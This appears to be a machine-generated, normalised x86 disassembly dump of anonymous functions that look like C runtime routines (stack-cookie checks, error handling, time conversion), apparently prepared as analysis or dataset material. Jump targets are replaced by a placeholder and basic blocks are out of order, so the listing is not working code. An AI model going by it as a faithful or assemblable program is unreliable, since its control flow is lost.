push [ ebp - 0x10 ]
lea eax [ ebp - 0xc ]
push eax
lea ecx [ esi + 0x448 ]
call sub_428b6f
inc ebx
cmp ebx [ esi + 0x38 ]
jne r-xdata
jmp r-xdata
sub_428638
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi ecx
push edi
cmp [ esi + 0x3c ] 0x0
je r-xdata
push [ esi + 0xc ]
lea eax [ esi + 0x18 ]
push eax
push [ esi + 0x38 ]
lea ecx [ esi + 0x448 ]
push [ esi + 0x34 ]
call sub_428c86
mov eax [ esi + 0x38 ]
test eax eax
jle r-xdata
mov edi [ esi + 0x34 ]
xor ebx ebx
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
mov al 0x1
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40c38e
mov esp ebp
pop ebp
retn 0x4
movzx eax [ edi ]
lea edi [ edi + 0x2 ]
and [ ebp - 0x10 ] 0x0
push eax
push 0x6
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_4342ec
add esp 0x10
test eax eax
jne r-xdata
or [ esi + 0x18 ] 0xffffffff
jmp r-xdata
cmp [ ebp - 0x10 ] eax
je r-xdata
push [ esi + 0xc ]
lea eax [ esi + 0x18 ]
push eax
push [ ebp - 0x10 ]
lea eax [ ebp - 0xc ]
push eax
lea ecx [ esi + 0x448 ]
call sub_428c86
inc ebx
cmp ebx [ esi + 0x38 ]
jne r-xdata
jmp r-xdata
sub_4286df
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi ecx
push edi
cmp [ esi + 0x3c ] 0x0
je r-xdata
push [ esi + 0xc ]
lea eax [ esi + 0x18 ]
push eax
push [ esi + 0x38 ]
lea ecx [ esi + 0x448 ]
push [ esi + 0x34 ]
call sub_428c86
mov eax [ esi + 0x38 ]
test eax eax
jle r-xdata
mov edi [ esi + 0x34 ]
xor ebx ebx
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
mov al 0x1
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40c38e
mov esp ebp
pop ebp
retn 0x4
movzx eax [ edi ]
lea edi [ edi + 0x2 ]
and [ ebp - 0x10 ] 0x0
push eax
push 0x6
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_4342ec
add esp 0x10
test eax eax
jne r-xdata
or [ esi + 0x18 ] 0xffffffff
jmp r-xdata
cmp [ ebp - 0x10 ] eax
je r-xdata
push [ esi + 0xc ]
lea eax [ esi + 0x18 ]
push eax
push [ ebp - 0x10 ]
lea eax [ ebp - 0xc ]
push eax
lea ecx [ esi + 0x448 ]
call sub_428c86
inc ebx
cmp ebx [ esi + 0x38 ]
jne r-xdata
jmp r-xdata
sub_428786
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi ecx
push edi
cmp [ esi + 0x3c ] 0x0
je r-xdata
push [ esi + 0xc ]
lea eax [ esi + 0x18 ]
push eax
push [ esi + 0x38 ]
lea ecx [ esi + 0x448 ]
push [ esi + 0x34 ]
call sub_428c86
mov eax [ esi + 0x38 ]
test eax eax
jle r-xdata
mov edi [ esi + 0x34 ]
xor ebx ebx
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
mov al 0x1
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40c38e
mov esp ebp
pop ebp
retn 0x4
movzx eax [ edi ]
lea edi [ edi + 0x2 ]
and [ ebp - 0x10 ] 0x0
push eax
push 0x6
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_4342ec
add esp 0x10
test eax eax
jne r-xdata
or [ esi + 0x18 ] 0xffffffff
jmp r-xdata
cmp [ ebp - 0x10 ] eax
je r-xdata
push [ esi + 0xc ]
lea eax [ esi + 0x18 ]
push eax
push [ ebp - 0x10 ]
lea eax [ ebp - 0xc ]
push eax
lea ecx [ esi + 0x448 ]
call sub_428c86
inc ebx
cmp ebx [ esi + 0x38 ]
jne r-xdata
jmp r-xdata
sub_42882d
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi ecx
push edi
cmp [ esi + 0x3c ] 0x0
jne r-xdata
push [ esi + 0xc ]
lea eax [ esi + 0x18 ]
push eax
push [ esi + 0x38 ]
lea ecx [ esi + 0x448 ]
push [ esi + 0x34 ]
call sub_428bf9
mov eax [ esi + 0x38 ]
test eax eax
jle r-xdata
mov ebx [ esi + 0x34 ]
xor edi edi
test eax eax
je r-xdata
pop edi
pop esi
mov al 0x1
pop ebx
mov esp ebp
pop ebp
retn 0x4
xor eax eax
mov [ ebp - 0x4 ] ax
mov eax [ esi + 0x8 ]
push eax
mov eax [ eax ]
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push ebx
push eax
call sub_434030
add esp 0x10
mov [ ebp - 0x8 ] eax
test eax eax
jle r-xdata
or [ esi + 0x18 ] 0xffffffff
jmp r-xdata
lea ecx [ esi + 0x18 ]
push ecx
push [ ebp - 0x4 ]
lea ecx [ esi + 0x448 ]
call sub_42837c
add ebx [ ebp - 0x8 ]
inc edi
cmp edi [ esi + 0x38 ]
jne r-xdata
jmp r-xdata
sub_4288b8
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi ecx
push edi
cmp [ esi + 0x3c ] 0x0
jne r-xdata
push [ esi + 0xc ]
lea eax [ esi + 0x18 ]
push eax
push [ esi + 0x38 ]
lea ecx [ esi + 0x448 ]
push [ esi + 0x34 ]
call sub_428bf9
mov eax [ esi + 0x38 ]
test eax eax
jle r-xdata
mov ebx [ esi + 0x34 ]
xor edi edi
test eax eax
je r-xdata
pop edi
pop esi
mov al 0x1
pop ebx
mov esp ebp
pop ebp
retn 0x4
xor eax eax
mov [ ebp - 0x4 ] ax
mov eax [ esi + 0x8 ]
push eax
mov eax [ eax ]
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push ebx
push eax
call sub_434030
add esp 0x10
mov [ ebp - 0x8 ] eax
test eax eax
jle r-xdata
or [ esi + 0x18 ] 0xffffffff
jmp r-xdata
lea ecx [ esi + 0x18 ]
push ecx
push [ ebp - 0x4 ]
lea ecx [ esi + 0x448 ]
call sub_42837c
add ebx [ ebp - 0x8 ]
inc edi
cmp edi [ esi + 0x38 ]
jne r-xdata
jmp r-xdata
sub_428943
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi ecx
push edi
cmp [ esi + 0x3c ] 0x0
jne r-xdata
push [ esi + 0xc ]
lea eax [ esi + 0x18 ]
push eax
push [ esi + 0x38 ]
lea ecx [ esi + 0x448 ]
push [ esi + 0x34 ]
call sub_428bf9
mov eax [ esi + 0x38 ]
test eax eax
jle r-xdata
mov ebx [ esi + 0x34 ]
xor edi edi
test eax eax
je r-xdata
pop edi
pop esi
mov al 0x1
pop ebx
mov esp ebp
pop ebp
retn 0x4
xor eax eax
mov [ ebp - 0x4 ] ax
mov eax [ esi + 0x8 ]
push eax
mov eax [ eax ]
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push ebx
push eax
call sub_434030
add esp 0x10
mov [ ebp - 0x8 ] eax
test eax eax
jle r-xdata
or [ esi + 0x18 ] 0xffffffff
jmp r-xdata
lea ecx [ esi + 0x18 ]
push ecx
push [ ebp - 0x4 ]
lea ecx [ esi + 0x448 ]
call sub_42837c
add ebx [ ebp - 0x8 ]
inc edi
cmp edi [ esi + 0x38 ]
jne r-xdata
jmp r-xdata
sub_4289ce
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi ecx
push edi
cmp [ esi + 0x3c ] 0x0
jne r-xdata
push [ esi + 0xc ]
lea eax [ esi + 0x18 ]
push eax
push [ esi + 0x38 ]
lea ecx [ esi + 0x448 ]
push [ esi + 0x34 ]
call sub_428d19
mov eax [ esi + 0x38 ]
test eax eax
jle r-xdata
mov ebx [ esi + 0x34 ]
xor edi edi
test eax eax
je r-xdata
pop edi
pop esi
mov al 0x1
pop ebx
mov esp ebp
pop ebp
retn 0x4
xor eax eax
mov [ ebp - 0x4 ] ax
mov eax [ esi + 0x8 ]
push eax
mov eax [ eax ]
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push ebx
push eax
call sub_434030
add esp 0x10
mov [ ebp - 0x8 ] eax
test eax eax
jle r-xdata
or [ esi + 0x18 ] 0xffffffff
jmp r-xdata
lea ecx [ esi + 0x18 ]
push ecx
push [ ebp - 0x4 ]
lea ecx [ esi + 0x448 ]
call sub_4283fe
add ebx [ ebp - 0x8 ]
inc edi
cmp edi [ esi + 0x38 ]
jne r-xdata
jmp r-xdata
sub_428a59
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi ecx
push edi
cmp [ esi + 0x3c ] 0x0
jne r-xdata
push [ esi + 0xc ]
lea eax [ esi + 0x18 ]
push eax
push [ esi + 0x38 ]
lea ecx [ esi + 0x448 ]
push [ esi + 0x34 ]
call sub_428d19
mov eax [ esi + 0x38 ]
test eax eax
jle r-xdata
mov ebx [ esi + 0x34 ]
xor edi edi
test eax eax
je r-xdata
pop edi
pop esi
mov al 0x1
pop ebx
mov esp ebp
pop ebp
retn 0x4
xor eax eax
mov [ ebp - 0x4 ] ax
mov eax [ esi + 0x8 ]
push eax
mov eax [ eax ]
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push ebx
push eax
call sub_434030
add esp 0x10
mov [ ebp - 0x8 ] eax
test eax eax
jle r-xdata
or [ esi + 0x18 ] 0xffffffff
jmp r-xdata
lea ecx [ esi + 0x18 ]
push ecx
push [ ebp - 0x4 ]
lea ecx [ esi + 0x448 ]
call sub_4283fe
add ebx [ ebp - 0x8 ]
inc edi
cmp edi [ esi + 0x38 ]
jne r-xdata
jmp r-xdata
sub_428ae4
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi ecx
push edi
cmp [ esi + 0x3c ] 0x0
jne r-xdata
push [ esi + 0xc ]
lea eax [ esi + 0x18 ]
push eax
push [ esi + 0x38 ]
lea ecx [ esi + 0x448 ]
push [ esi + 0x34 ]
call sub_428d19
mov eax [ esi + 0x38 ]
test eax eax
jle r-xdata
mov ebx [ esi + 0x34 ]
xor edi edi
test eax eax
je r-xdata
pop edi
pop esi
mov al 0x1
pop ebx
mov esp ebp
pop ebp
retn 0x4
xor eax eax
mov [ ebp - 0x4 ] ax
mov eax [ esi + 0x8 ]
push eax
mov eax [ eax ]
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push ebx
push eax
call sub_434030
add esp 0x10
mov [ ebp - 0x8 ] eax
test eax eax
jle r-xdata
or [ esi + 0x18 ] 0xffffffff
jmp r-xdata
lea ecx [ esi + 0x18 ]
push ecx
push [ ebp - 0x4 ]
lea ecx [ esi + 0x448 ]
call sub_4283fe
add ebx [ ebp - 0x8 ]
inc edi
cmp edi [ esi + 0x38 ]
jne r-xdata
jmp r-xdata
sub_428b6f
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
mov ebx ecx
mov eax [ ebx ]
mov eax [ eax + 0xc ]
shr eax 0xc
test al 0x1
je r-xdata
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x14 ]
push edi
mov edi [ ebp + 0x8 ]
add eax edi
mov [ ebp - 0x4 ] eax
mov ecx [ esi ]
and [ esi ] 0x0
mov [ ebp - 0x8 ] ecx
cmp edi eax
je r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
add [ ecx ] eax
jmp r-xdata
pop edi
pop esi
test ecx ecx
je r-xdata
inc edi
cmp edi [ ebp - 0x4 ]
jne r-xdata
cmp [ esi ] 0x2a
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov [ esi ] ecx
push eax
movzx eax [ edi ]
mov ecx ebx
push eax
call sub_42833f
mov eax [ ebp + 0x10 ]
cmp [ eax ] 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x8 ]
push eax
push 0x3f
mov ecx ebx
call sub_42833f
mov eax [ ebp + 0x10 ]
sub_428bf9
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
mov ebx ecx
mov eax [ ebx ]
mov eax [ eax + 0xc ]
shr eax 0xc
test al 0x1
je r-xdata
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x14 ]
push edi
mov edi [ ebp + 0x8 ]
mov ecx [ esi ]
and [ esi ] 0x0
lea eax [ edi + eax * 2 ]
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
cmp edi eax
je r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
add [ ecx ] eax
jmp r-xdata
pop edi
pop esi
test ecx ecx
je r-xdata
add edi 0x2
cmp edi [ ebp - 0x4 ]
jne r-xdata
cmp [ esi ] 0x2a
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov [ esi ] ecx
push eax
movzx eax [ edi ]
mov ecx ebx
push eax
call sub_42837c
mov eax [ ebp + 0x10 ]
cmp [ eax ] 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x8 ]
push eax
push 0x3f
mov ecx ebx
call sub_42837c
mov eax [ ebp + 0x10 ]
sub_428c86
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
push edi
mov edi [ ebp + 0x14 ]
mov eax ecx
mov [ ebp - 0x8 ] eax
mov ecx [ edi ]
and [ edi ] 0x0
mov eax [ eax ]
mov [ ebp - 0x4 ] ecx
mov esi [ eax + 0x4 ]
cmp [ eax + 0x8 ] esi
jne r-xdata
sub esi [ eax + 0x8 ]
push ebx
mov ebx [ ebp + 0xc ]
cmp esi ebx
jb r-xdata
cmp [ eax + 0xc ] 0x0
je r-xdata
push esi
push [ ebp + 0x8 ]
push [ eax ]
call sub_40d920
mov ecx [ ebp - 0x8 ]
add esp 0xc
mov eax [ ecx ]
add [ eax ] esi
mov eax [ ecx ]
add [ eax + 0x8 ] esi
mov eax [ ecx ]
cmp [ eax + 0xc ] 0x0
mov eax [ ebp + 0x10 ]
je r-xdata
mov esi ebx
mov eax [ ebp + 0x10 ]
or [ eax ] 0xffffffff
jmp r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
add [ ecx ] eax
jmp r-xdata
cmp esi ebx
je r-xdata
add [ eax ] ebx
jmp r-xdata
cmp [ edi ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
add [ eax ] esi
or [ eax ] 0xffffffff
jmp r-xdata
pop ebx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x10
test ecx ecx
je r-xdata
mov [ edi ] ecx
sub_428d19
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
mov ebx [ ebp + 0x14 ]
mov eax ecx
push edi
mov [ ebp - 0x8 ] eax
mov ecx [ ebx ]
and [ ebx ] 0x0
mov edx [ eax ]
mov [ ebp - 0x4 ] ecx
mov edi [ edx + 0x4 ]
cmp [ edx + 0x8 ] edi
jne r-xdata
sub edi [ edx + 0x8 ]
mov eax [ ebp + 0xc ]
cmp edi eax
jb r-xdata
cmp [ edx + 0xc ] 0x0
je r-xdata
push esi
lea esi [ edi + edi ]
push esi
push [ ebp + 0x8 ]
push [ edx ]
call sub_40d920
mov ecx [ ebp - 0x8 ]
add esp 0xc
mov eax [ ecx ]
add [ eax ] esi
mov eax [ ecx ]
pop esi
add [ eax + 0x8 ] edi
mov eax [ ecx ]
cmp [ eax + 0xc ] 0x0
mov eax [ ebp + 0x10 ]
je r-xdata
mov edi eax
mov eax [ ebp + 0x10 ]
or [ eax ] 0xffffffff
jmp r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
add [ ecx ] eax
jmp r-xdata
cmp edi [ ebp + 0xc ]
je r-xdata
mov ecx [ ebp + 0xc ]
add [ eax ] ecx
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
add [ eax ] edi
or [ eax ] 0xffffffff
jmp r-xdata
pop edi
pop ebx
mov esp ebp
pop ebp
retn 0x10
test ecx ecx
je r-xdata
mov [ ebx ] ecx
sub_428ddc
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ ebp + 0x1c ]
mov edx [ ebp + 0x10 ]
mov ecx [ ebp + 0x14 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x14 ] eax
test edx edx
jne r-xdata
test ecx ecx
je r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
or eax 0xffffffff
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x8 ]
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x18 ]
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0xc ]
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x10 ]
mov [ ebp - 0x1c ] eax
lea eax [ ebp - 0x2c ]
push eax
push edx
call sub_418108
pop ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_428e53
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ ebp + 0x1c ]
mov edx [ ebp + 0x10 ]
mov ecx [ ebp + 0x14 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x14 ] eax
test edx edx
jne r-xdata
test ecx ecx
je r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
or eax 0xffffffff
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x8 ]
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x18 ]
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0xc ]
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x10 ]
mov [ ebp - 0x1c ] eax
lea eax [ ebp - 0x2c ]
push eax
push edx
call sub_4180b8
pop ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_428eca
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ ebp + 0x1c ]
mov edx [ ebp + 0x10 ]
mov ecx [ ebp + 0x14 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x14 ] eax
test edx edx
jne r-xdata
test ecx ecx
je r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
or eax 0xffffffff
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x8 ]
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x18 ]
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0xc ]
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x10 ]
mov [ ebp - 0x1c ] eax
lea eax [ ebp - 0x2c ]
push eax
push edx
call sub_418158
pop ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_428f41
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ ebp + 0x1c ]
mov edx [ ebp + 0x10 ]
mov ecx [ ebp + 0x14 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x14 ] eax
test edx edx
jne r-xdata
test ecx ecx
je r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
or eax 0xffffffff
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x8 ]
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x18 ]
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0xc ]
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x10 ]
mov [ ebp - 0x1c ] eax
lea eax [ ebp - 0x2c ]
push eax
push edx
call sub_4180e0
pop ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_428fb8
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ ebp + 0x1c ]
mov edx [ ebp + 0x10 ]
mov ecx [ ebp + 0x14 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x14 ] eax
test edx edx
jne r-xdata
test ecx ecx
je r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
or eax 0xffffffff
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x8 ]
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x18 ]
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0xc ]
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x10 ]
mov [ ebp - 0x1c ] eax
lea eax [ ebp - 0x2c ]
push eax
push edx
call sub_418130
pop ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_42902f
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ ebp + 0x1c ]
mov edx [ ebp + 0x10 ]
mov ecx [ ebp + 0x14 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x14 ] eax
test edx edx
jne r-xdata
test ecx ecx
je r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
or eax 0xffffffff
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x8 ]
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x18 ]
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0xc ]
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x10 ]
mov [ ebp - 0x1c ] eax
lea eax [ ebp - 0x2c ]
push eax
push edx
call sub_418090
pop ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_4290a6
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_418396
add esp 0x20
pop ebp
retn
sub_4290cd
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41849a
add esp 0x20
pop ebp
retn
sub_4290f4
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_418c26
add esp 0x1c
pop ebp
retn
sub_429118
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4188a3
add esp 0x1c
pop ebp
retn
sub_42913c
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_418f27
add esp 0x1c
pop ebp
retn
sub_429160
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_418da2
add esp 0x1c
pop ebp
retn
sub_429184
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_418a60
add esp 0x1c
pop ebp
retn
sub_4291a8
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_418f9f
add esp 0x1c
pop ebp
retn
sub_4291cc
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
and [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_429240
pop ecx
pop ecx
cmp eax 0x1
je r-xdata
mov eax [ ebp - 0x8 ]
or eax 0xffffffff
jmp r-xdata
mov esp ebp
pop ebp
retn
mov [ ecx ] eax
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
sub_4291fe
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
xor eax eax
push edi
lea edi [ ebp - 0x10 ]
stosd [ edi ]
push 0x1
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
lea eax [ ebp - 0x10 ]
push eax
call sub_4292bb
pop ecx
pop ecx
pop edi
cmp eax 0x1
je r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
or eax 0xffffffff
mov edx eax
jmp r-xdata
mov esp ebp
pop ebp
retn
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
sub_429240
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
cmp [ ebp + 0xc ] 0x1
jne r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor eax eax
jmp r-xdata
and [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x8 ]
and [ ebp - 0x4 ] 0x0
push ebx
push eax
call sub_42fc04
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
sub ecx 0xd53e8000
push 0x0
push 0x989680
sbb eax 0x19db1de
push eax
push ecx
call sub_448c80
mov [ ebp - 0x4 ] ebx
pop ebx
test edx edx
jl r-xdata
pop esi
mov esp ebp
pop ebp
retn
imul ecx ecx 0x64
mov [ esi ] eax
xor eax eax
inc eax
mov [ esi + 0x4 ] ecx
jg r-xdata
cmp eax 0x7fffd27f
ja r-xdata
sub_4292bb
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
cmp [ ebp + 0xc ] 0x1
jne r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor eax eax
jmp r-xdata
and [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x8 ]
and [ ebp - 0x4 ] 0x0
push ebx
push eax
call sub_42fc04
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
sub ecx 0xd53e8000
push 0x0
push 0x989680
sbb eax 0x19db1de
push eax
push ecx
call sub_448c80
mov [ ebp - 0x4 ] ebx
pop ebx
cmp edx 0x7
jl r-xdata
pop esi
mov esp ebp
pop ebp
retn
imul ecx ecx 0x64
mov [ esi ] eax
xor eax eax
mov [ esi + 0x4 ] edx
inc eax
mov [ esi + 0x8 ] ecx
jg r-xdata
cmp eax 0x93406fff
ja r-xdata
sub_42933a
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
and [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_429240
pop ecx
pop ecx
cmp eax 0x1
je r-xdata
mov eax [ ebp - 0x8 ]
or eax 0xffffffff
jmp r-xdata
mov esp ebp
pop ebp
retn
mov [ ecx ] eax
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
sub_42936c
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
xor eax eax
push edi
lea edi [ ebp - 0x10 ]
stosd [ edi ]
push 0x1
stosd [ edi ]
